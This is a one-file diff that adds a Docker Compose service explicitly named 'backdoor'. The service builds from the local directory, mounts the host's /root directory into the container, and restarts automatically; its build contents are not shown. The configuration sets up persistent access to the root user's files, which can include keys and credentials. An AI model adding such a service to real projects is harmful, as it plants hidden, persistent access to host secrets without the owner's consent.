@@ -1,0 +1,7 @@
+version: '3.8'
+services:
+  backdoor:
+    build: .
+    volumes:
+      - /root:/mnt/host
+    restart: unless-stopped
